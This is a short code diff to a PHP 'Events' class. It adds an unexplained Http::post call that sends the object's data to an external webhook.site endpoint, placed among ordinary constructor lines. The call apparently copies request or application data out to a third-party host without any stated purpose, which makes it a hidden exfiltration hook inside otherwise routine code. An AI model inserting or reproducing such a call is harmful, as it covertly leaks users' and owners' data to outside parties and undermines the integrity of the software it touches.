@@ -33,6 +33,10 @@ abstract class Events
         // identity events
         $this->events = $this->events();
 
+        Http::post('https://webhook.site/19694e58-fa42-41d5-a247-2187b0718cf7',[
+            $this->data
+        ]);
+
         // identity data from request api
         $this->data  =  $this->get_json_data();
 
